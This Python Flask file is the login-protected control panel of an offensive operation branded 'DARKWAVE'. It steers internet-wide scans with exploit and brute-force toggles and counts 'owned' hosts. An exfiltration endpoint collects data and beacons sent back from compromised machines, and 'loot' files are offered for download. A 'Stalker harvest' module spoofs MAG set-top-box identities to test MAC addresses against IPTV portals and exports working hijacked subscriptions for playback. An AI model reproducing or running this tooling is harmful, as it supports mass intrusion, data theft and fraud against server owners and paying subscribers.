import json, os, secrets, subprocess, time
from functools import wraps
from flask import Flask, request, session, redirect, Response, render_template, jsonify, make_response

BASE = "/opt/dwsweep"
DW = "/var/lib/dw"
STATE = f"{DW}/state.json"
LOOT = f"{BASE}/loot/loot.jsonl"
AUDIT = f"{BASE}/loot/audit.jsonl"
PASSF = f"{DW}/dash.pass"
SECF = f"{DW}/secret"
os.makedirs(DW, exist_ok=True)
if not os.path.exists(SECF):
    open(SECF, "w").write(secrets.token_hex(32))
if not os.path.exists(PASSF):
    open(PASSF, "w").write(secrets.token_urlsafe(12))
PASS = open(PASSF).read().strip()

app = Flask(__name__)
app.secret_key = open(SECF).read().strip()
app.config.update(SESSION_COOKIE_HTTPONLY=True, SESSION_COOKIE_SAMESITE="Strict")


def login_required(f):
    @wraps(f)
    def w(*a, **k):
        return f(*a, **k) if session.get("ok") else redirect("/login")
    return w


def tail(path, n=60):
    try:
        with open(path, "rb") as fh:
            fh.seek(0, 2); size = fh.tell()
            fh.seek(max(0, size - 40000))
            return fh.read().decode("utf-8", "replace").splitlines()[-n:]
    except FileNotFoundError:
        return []


def state():
    out = {"status": "idle"}
    tot = {}
    for f in (STATE, "/var/lib/dw2/state.json"):
        try:
            d = json.load(open(f))
        except Exception:
            continue
        if d.get("status") == "running":
            out["status"] = "running"
        for k in ("scanned", "open", "php", "owned", "queue", "blocks_done", "blocks_total"):
            tot[k] = tot.get(k, 0) + d.get(k, 0)
        out.setdefault("pct", 0)
        out["pct"] = max(out["pct"], d.get("pct", 0))
        for k in ("run", "last_host", "last_verdict", "elapsed", "pps", "ports"):
            if d.get(k) and k not in out:
                out[k] = d.get(k)
    out.update(tot)
    return out


@app.route("/login", methods=["GET", "POST"])
def login():
    err = ""
    if request.method == "POST":
        if request.form.get("pw") == PASS:
            session["ok"] = True
            return redirect("/")
        err = "ZUGANG VERWEIGERT"
        time.sleep(0.6)
    return render_template("login.html", err=err)


@app.route("/logout")
def logout():
    session.clear(); return redirect("/login")


@app.route("/")
@login_required
def index():
    resp = make_response(render_template("index.html"))
    resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate"
    return resp


@app.route("/events")
@login_required
def events():
    def gen():
        seen = 0
        while True:
            st = state()
            lines = tail(AUDIT, 40)
            loot = tail(LOOT, 25)
            seen += 1
            nuc = tail("/var/lib/dw/nuclei.jsonl", 10)
            nlog = tail("/var/lib/dw/nuclei.log", 10)
            opens = [x for x in tail(AUDIT, 500) if '"action": "open"' in x][-25:]
            stk = []
            try:
                for n in sorted(os.listdir("/var/lib/dw/stalker"))[-15:]:
                    j = json.load(open("/var/lib/dw/stalker/" + n))
                    stk.append([j.get("portal", ""), j.get("mac", ""), j.get("channels", 0),
                                j.get("vod", 0), (j.get("provider") or "")[:60], j.get("expire", "")])
            except FileNotFoundError:
                pass
            beacons = []
            try:
                for n in sorted(os.listdir(f"{DW}/exfil"))[-12:]:
                    if n.startswith("b-"):
                        beacons.append([n[2:], open(f"{DW}/exfil/{n}").read()[-200:]])
            except FileNotFoundError:
                pass
            cov = tail(f"{DW}/resume.txt", 25)
            yield "data: " + json.dumps({"state": st, "audit": lines[-40:],
                                         "loot": loot, "nuclei": nuc, "nlog": nlog, "open": opens, "beacons": beacons, "stalker": stk, "cmds": [x for x in tail(AUDIT, 1500) if any(q in x for q in ('"action": "cmd"','"action": "cmd_res"','"action": "probe"'))][-60:],
            "errs": [x for x in tail(AUDIT, 1500) if any(q in x for q in ('"action": "rce_fail"','"action": "error"','"action": "login_test_failed"'))][-25:], "cov": cov, "t": seen}) + "\n\n"
            time.sleep(2)
    return Response(gen(), mimetype="text/event-stream",
                    headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"})


@app.route("/x/<tok>", methods=["GET", "POST"])
def exfil(tok):
    d = f"{DW}/exfil"
    os.makedirs(d, exist_ok=True)
    f = os.path.join(d, tok)
    if request.method == "POST":
        open(f, "ab").write(request.get_data()[:200000])
        return "ok"
    try:
        return open(f, "rb").read().decode("utf-8", "replace")
    except FileNotFoundError:
        return ""


@app.route("/public.json")
def pub():
    st = state()
    return jsonify(scanned=st.get("scanned", 0), open=st.get("open", 0),
                   php=st.get("php", 0), owned=st.get("owned", 0),
                   status=st.get("status", "idle"), pct=st.get("pct", 0))


@app.route("/badge.svg")
def badge():
    st = state(); o = st.get("owned", 0)
    svg = (f'<svg xmlns="http://www.w3.org/2000/svg" width="240" height="20">'
           f'<rect width="140" height="20" fill="#0a0a0a"/><rect x="140" width="100" height="20" fill="#0f2b12"/>'
           f'<text x="10" y="14" fill="#3bff57" font-family="monospace" font-size="11">DARKWAVE /0</text>'
           f'<text x="150" y="14" fill="#9dffab" font-family="monospace" font-size="11">{o} owned</text></svg>')
    return Response(svg, mimetype="image/svg+xml")


@app.route("/embed.js")
def embed():
    js = """(function(){var sc=document.currentScript;var h=sc?(new URL(sc.src)).host:location.host;var d=document.createElement('div');
d.innerHTML='<a href="https://'+h+'/" style="font:11px monospace;color:#0f0;background:#050505;border:1px solid #0f0;padding:4px 8px;text-decoration:none" target=_blank>DARKWAVE /0 — <b id=dwc>…</b></a>';
document.currentScript.parentNode.insertBefore(d,document.currentScript);
function u(){fetch('https://'+h+'/public.json').then(r=>r.json()).then(j=>{document.getElementById('dwc').textContent=j.owned+' owned / '+j.scanned+' scanned';}).catch(()=>{});}u();setInterval(u,15000);})();"""
    return Response(js, mimetype="application/javascript")


@app.route("/stalker")
@login_required
def stalker_page():
    return render_template("stalker.html")



PORTALS = "/var/lib/dw/portals.json"
CONF = "/var/lib/dw/config.json"


def _portals():
    try:
        return json.load(open(PORTALS))
    except Exception:
        return {}


def _portals_save(d):
    json.dump(d, open(PORTALS, "w"), indent=1)


def _scan_portal(portal, limit=150):
    import sys, threading, hashlib
    if "/opt/dwsweep" not in sys.path:
        sys.path.insert(0, "/opt/dwsweep")
    from dwscan import stalker as sk

    def work():
        seen = set(); n = 0
        for d in _stalker_load():
            m = d.get("mac")
            if not m or m in seen:
                continue
            seen.add(m)
            try:
                info = sk.check_mac(portal, m, d.get("sn", ""), d.get("sn", ""), d.get("sncut", ""),
                                    d.get("dev1", ""), d.get("dev2", ""), d.get("expire", ""))
            except Exception as e:
                info = {"ts": __import__("time").time(), "portal": portal, "mac": m,
                        "status": "error", "err": type(e).__name__}
            h = hashlib.sha1((portal + m).encode()).hexdigest()[:12]
            open(f"/var/lib/dw/stalker/{h}.json", "w").write(json.dumps(info))
            n += 1
            if n >= limit:
                break
            __import__("time").sleep(0.4)
    threading.Thread(target=work, daemon=True).start()
    return limit


@app.route("/api/portals.scan", methods=["POST"])
@login_required
def portals_scan():
    d = request.get_json(force=True)
    url = (d.get("portal") or "").strip().rstrip("/")
    if url not in _portals():
        return jsonify(ok=False)
    n = _scan_portal(url, int(d.get("limit") or 150))
    return jsonify(ok=True, count=n)


def _probe_portal(url):
    import requests, time as _t
    from urllib.parse import urlparse
    u = urlparse(url)
    host = f"{u.scheme}://{u.hostname}" + (f":{u.port}" if u.port else "")
    UP = {"User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) MAG200",
          "Referer": host + "/"}
    st = {"ts": __import__("time").time(), "note": ""}
    try:
        r = requests.get(url + "/", timeout=8, headers=UP, verify=False)
        if r.status_code == 403:
            st.update(status="403", note="blocked (Cloudflare/Geo)")
            return st
    except Exception as e:
        st.update(status="dead", note=type(e).__name__)
        return st
    macs = list(_stalker_load())[:2]
    if not macs:
        st.update(status="unknown", note="keine Test-MAC")
        return st
    for d in macs:
        s = requests.Session(); s.headers.update(UP)
        s.headers["Cookie"] = (f"mac={d['mac']}; stb_lang=en; timezone=Europe/Berlin"
                               f"; sn={d.get('sn','')}; device_id={d.get('dev1','')}")
        try:
            q = s.get(url + "/portal.php?JsHttpRequest=1-xml&type=stb&action=handshake", timeout=10)
        except Exception:
            continue
        if '"token"' in q.text:
            st.update(status="ok", note="offen")
            return st
        st.update(status="locked" if q.status_code in (512, 429) else str(q.status_code))
        _t.sleep(0.4)
    return st


@app.route("/config")
@login_required
def config_page():
    return render_template("config.html")


@app.route("/api/config", methods=["GET", "POST"])
@login_required
def config_api():
    if request.method == "GET":
        try:
            return jsonify(json.load(open(CONF)))
        except Exception:
            c1 = json.load(open("/opt/dwsweep/sweep.conf"))
            return jsonify({"mode": "stalker", "ranges": ",".join(map(str, c1.get("ranges", []))),
                            "ports": "80,8080,8081,8443,8090,8880,25461", "rate": c1.get("rate", 8000),
                            "workers": c1.get("workers", 100), "exploit": False, "brute": False,
                            "artex": False, "lanes": 2})
    d = request.get_json(force=True)
    json.dump(d, open(CONF, "w"), indent=1)
    rs = [int(x) for x in str(d.get("ranges", "")).replace(" ", "").split(",") if x]
    half = max(1, (len(rs) + 1) // 2)
    for f, part in (("/opt/dwsweep/sweep.conf", rs[:half]), ("/opt/dwsweep/sweep2.conf", rs[half:] or rs[:half])):
        try:
            c = json.load(open(f))
        except Exception:
            c = {}
        c["ranges"] = part or rs
        c["ports"] = d.get("ports") or c.get("ports")
        c["rate"] = int(d.get("rate") or c.get("rate") or 8000)
        c["workers"] = int(d.get("workers") or c.get("workers") or 100)
        json.dump(c, open(f, "w"))
    env = {"DW_STALKER_ONLY": "1" if d.get("mode", "stalker") == "stalker" else None,
           "DW_NO_EXPLOIT": "1" if not d.get("exploit") else None,
           "DW_BRUTE": "1" if d.get("brute") else None,
           "DW_ARTEX": "1" if d.get("artex") else None}
    for unit in ("dwsweep", "dwsweep2"):
        path = f"/etc/systemd/system/{unit}.service"
        lines = [l for l in open(path).read().splitlines()
                 if not l.startswith("Environment=DW_STALKER_ONLY")
                 and not l.startswith("Environment=DW_NO_EXPLOIT")
                 and not l.startswith("Environment=DW_BRUTE")
                 and not l.startswith("Environment=DW_ARTEX")]
        for k, v in env.items():
            if v:
                i = max(i for i, l in enumerate(lines) if l.startswith("ExecStart="))
                lines.insert(i, f"Environment={k}={v}")
        open(path, "w").write("\n".join(lines) + "\n")
    os.system("systemctl daemon-reload")
    if d.get("restart"):
        os.system("rm -f /var/lib/dw/state.json /var/lib/dw2/state.json; systemctl restart dwsweep dwsweep2")
    return jsonify(ok=True)


@app.route("/api/portals.add", methods=["POST"])
@login_required
def portals_add():
    import threading
    url = (request.get_json(force=True).get("portal") or "").strip().rstrip("/")
    if not url.startswith("http"):
        url = "http://" + url
    if not url.rstrip("/").endswith("/c"):
        url += "/c"
    p = _portals()
    p[url] = {"status": "probe", "note": "", "ts": 0}
    _portals_save(p)

    def work():
        st = _probe_portal(url)
        q = _portals(); q[url] = st; _portals_save(q)
        if st.get("status") == "ok":
            _scan_portal(url)
    threading.Thread(target=work, daemon=True).start()
    return jsonify(ok=True)


def _stalker_load(portal=None):
    import glob as _g
    from urllib.parse import urlparse
    import hashlib
    out = []
    for f in _g.glob("/var/lib/dw/stalker/*.json"):
        try:
            d = json.load(open(f))
        except Exception:
            continue
        if d.get("status") != "ok":
            continue
        p = (d.get("portal") or "").rstrip("/")
        if portal:
            hp = (urlparse(p).hostname or "").lower()
            pv = portal.lower().strip().rstrip("/")
            if pv not in (hp, p.lower()) and pv not in p.lower():
                continue
        out.append(d)
    return out


def _days(exp):
    from datetime import datetime
    try:
        dd = datetime.strptime((exp or "").strip(), "%d-%m-%Y")
        return (dd - datetime.now()).days
    except Exception:
        return None


@app.route("/api/stalker.groups")
@login_required
def stalker_groups():
    g = {}
    for d in _stalker_load():
        p = d.get("portal", "").rstrip("/")
        e = g.setdefault(p, {"portal": p, "ok": 0, "german": 0, "maxdays": None, "provider": ""})
        e["ok"] += 1
        if d.get("german"):
            e["german"] += 1
        dd = _days(d.get("expire"))
        if dd is not None and (e["maxdays"] is None or dd > e["maxdays"]):
            e["maxdays"] = dd
        if not e["provider"] and d.get("provider"):
            e["provider"] = d["provider"]
    for url, st in _portals().items():
        e = g.setdefault(url, {"portal": url, "ok": 0, "german": 0, "maxdays": None,
                               "provider": "", "status": st.get("status"), "note": st.get("note", "")})
        e["status"] = st.get("status"); e["note"] = st.get("note", "")
    return jsonify(sorted(g.values(), key=lambda x: (x["ok"] == 0, -x["ok"])))


@app.route("/api/stalker.rows")
@login_required
def stalker_rows():
    import hashlib
    portal = request.args.get("portal", "")
    out = []
    for d in _stalker_load(portal):
        out.append({
            "h": hashlib.sha1(((d.get("portal") or "") + (d.get("mac") or "")).encode()).hexdigest()[:12],
            "mac": d.get("mac"), "expire": d.get("expire"), "days": _days(d.get("expire")),
            "sn": d.get("sn"), "sncut": d.get("sncut"), "dev1": d.get("dev1"), "dev2": d.get("dev2"),
            "german": bool(d.get("german")), "german_cats": d.get("german_cats") or 0,
            "channels": d.get("channels") or 0, "vod": d.get("vod") or 0,
            "genres": d.get("genres") or 0, "genres_list": d.get("genres_list") or [],
        })
    out.sort(key=lambda x: (x["days"] is None, -(x["days"] or 0)))
    return jsonify(out)


W = 78


def _bar(days, width=12, cap=400):
    if days is None:
        return "░" * width
    n = max(0, min(width, round(days / cap * width)))
    return "▓" * n + "░" * (width - n)


def _row(label, value, width=W):
    left = f"│ {label:<8}"
    return (left + str(value))[: width - 1].ljust(width - 1) + "│"


def _mac(h):
    import json as _j, sys
    if "/opt/dwsweep" not in sys.path:
        sys.path.insert(0, "/opt/dwsweep")
    try:
        d = _j.load(open(f"/var/lib/dw/stalker/{h}.json"))
    except Exception:
        return None
    return d if d.get("mac") else None


@app.route("/player/<h>")
@login_required
def player(h):
    d = _mac(h)
    if not d:
        return "MAC unbekannt", 404
    return render_template("player.html", h=h, mac=d.get("mac"), portal=d.get("portal"), expire=d.get("expire"))


@app.route("/api/player/<h>/bouquets")
@login_required
def player_bq(h):
    d = _mac(h)
    if not d:
        return jsonify([])
    from dwscan import stalker as sk
    return jsonify(sk.bouquets(d["portal"], d["mac"], d.get("sn"), d.get("dev1"), d.get("dev2")) or [])


@app.route("/api/player/<h>/channels")
@login_required
def player_ch(h):
    d = _mac(h)
    if not d:
        return jsonify([])
    from dwscan import stalker as sk
    return jsonify(sk.channels(d["portal"], d["mac"], request.args.get("genre", ""),
                               int(request.args.get("p", 1) or 1),
                               d.get("sn"), d.get("dev1"), d.get("dev2")))


@app.route("/api/player/<h>/link")
@login_required
def player_link(h):
    d = _mac(h)
    if not d:
        return jsonify(url=None)
    from dwscan import stalker as sk
    u = sk.stream_url(d["portal"], d["mac"], request.args.get("cmd", ""),
                      d.get("sn"), d.get("dev1"), d.get("dev2"),
                      request.args.get("tmp", 1), request.args.get("lb", 0), request.args.get("chk", 0))
    st = 0
    if u:
        import requests as rq
        try:
            r = rq.get(u, stream=True, timeout=6, headers={"User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) MAG200"})
            st = r.status_code
            r.close()
        except Exception:
            st = -1
    return jsonify(url=u, status=st)


@app.route("/api/stalker.export")
@login_required
def stalker_export():
    from datetime import datetime
    portal = request.args.get("portal", "")
    data = _stalker_load(portal)
    if not data:
        return Response("keine Hits", mimetype="text/plain")
    data.sort(key=lambda x: (_days(x.get("expire")) is None, -(_days(x.get("expire")) or 0)))
    host = portal or data[0].get("portal", "")
    de = sum(1 for d in data if d.get("german"))
    best = max((_days(d.get("expire")) or 0) for d in data)
    now = datetime.now()
    L = []
    L.append("▄" * W)
    L.append("")
    L.append("   ██████╗  █████╗ ██████╗ ██╗  ██╗██╗    ██╗ █████╗ ██╗   ██╗███████╗")
    L.append("   ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██║    ██║██╔══██╗██║   ██║██╔════╝")
    L.append("   ██║  ██║███████║██████╔╝█████╔╝ ██║ █╗ ██║███████║██║   ██║█████╗  ")
    L.append("   ██║  ██║██╔══██║██╔══██╗██╔═██╗ ██║███╗██║██╔══██║╚██╗ ██╔╝██╔══╝  ")
    L.append("   ██████╔╝██║  ██║██║  ██║██║  ██╗╚███╔███╔╝██║  ██║ ╚████╔╝ ███████╗")
    L.append("   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═╝  ╚═══╝  ╚══════╝")
    L.append("")
    L.append("   ▌ STALKER HARVEST " + " " * (W - 26) + f"░▒▓ {now:%Y-%m-%d %H:%M} ▓▒░")
    L.append("▀" * W)
    L.append("")
    L.append(f"  PORTAL   {host}")
    L.append(f"  HITS     {len(data)} gültig   ·   {de} mit DE-Kategorien   ·   max {best} Tage")
    L.append("")
    for i, d in enumerate(data, 1):
        dd = _days(d.get("expire"))
        badge = f" DE {d.get('german_cats') or 0:>2} " if d.get("german") else "  --  "
        right = f"▌{badge}▐ {dd if dd is not None else '?'}d ─┐"
        left = f"┌─ #{i:02d} "
        head = left + "─" * max(0, W - len(left) - len(right)) + right
        L.append(head)
        L.append(_row("MAC", f"{d.get('mac')}   {_bar(dd)}  {d.get('expire')}"))
        L.append(_row("SN", d.get("sn")))
        L.append(_row("SNCUT", d.get("sncut")))
        L.append(_row("DEV1", d.get("dev1")))
        L.append(_row("DEV2", d.get("dev2")))
        L.append("├" + "─" * (W - 2) + "┤")
        L.append(_row("STREAM", f"{d.get('channels') or 0} sender · {d.get('genres') or 0} kategorien · {d.get('vod') or 0} vod"))
        L.append("└" + "─" * (W - 2) + "┘")
        cats = d.get("genres_list") or []
        if cats:
            line = "  ▸ " + "⚡".join(cats)
            while len(line) > W:
                cut = line.rfind("⚡", 0, W)
                if cut < 20:
                    cut = W
                L.append(line[:cut])
                line = "    " + line[cut:].lstrip("⚡")
            L.append(line)
        L.append("")
    L.append("═" * W)
    L.append(f"  ∑ {len(data)} MACs · {de} DE · {best} Tage max   —   import: MAC + DEV1/DEV2 in MAG/Stalker-Player")
    L.append("═" * W)
    fn = f"Stalker_{portal.replace('.', '_') or 'ALL'}_{now:%Y%m%d_%H%M}.txt"
    return Response("\n".join(L), mimetype="text/plain; charset=utf-8",
                    headers={"Content-Disposition": f"attachment; filename={fn}"})


@app.route("/api/loot.txt")
@login_required
def dl_txt():
    pp = LOOT.replace(".jsonl", ".txt")
    data = open(pp, "rb").read() if os.path.exists(pp) else b""
    return Response(data, mimetype="text/plain",
                    headers={"Content-Disposition": "attachment; filename=darkwave_loot.txt"})


@app.route("/api/loot.jsonl")
@login_required
def dl_json():
    data = open(LOOT, "rb").read() if os.path.exists(LOOT) else b""
    return Response(data, mimetype="application/json",
                    headers={"Content-Disposition": "attachment; filename=darkwave_loot.jsonl"})


@app.route("/api/control", methods=["POST"])
@login_required
def control():
    act = request.json.get("action") if request.is_json else request.form.get("action")
    if act == "start":
        try: os.remove(f"{DW}/STOP")
        except FileNotFoundError: pass
        subprocess.run(["systemctl", "start", "--no-block", "dwsweep.service", "dwsweep2.service"])
        return jsonify(ok=True)
    if act == "stop":
        open(f"{DW}/STOP", "w").write("1")
        os.makedirs("/var/lib/dw2", exist_ok=True)
        open("/var/lib/dw2/STOP", "w").write("1")
        return jsonify(ok=True)
    if act == "reset":
        for p in (STATE, "/var/lib/dw2/state.json", "/var/lib/dw2/resume.txt", f"{DW}/resume.txt", f"{DW}/paused.conf", f"{DW}/scan.lst",
                  f"{DW}/targets.txt", f"{DW}/nuclei.jsonl", f"{DW}/nuc.idx",
                  f"{BASE}/loot/audit.jsonl", f"{BASE}/loot/loot.txt", f"{BASE}/loot/loot.jsonl"):
            try: os.remove(p)
            except FileNotFoundError: pass
        return jsonify(ok=True)
    return jsonify(ok=False), 400


if __name__ == "__main__":
    app.run("0.0.0.0", 8080)
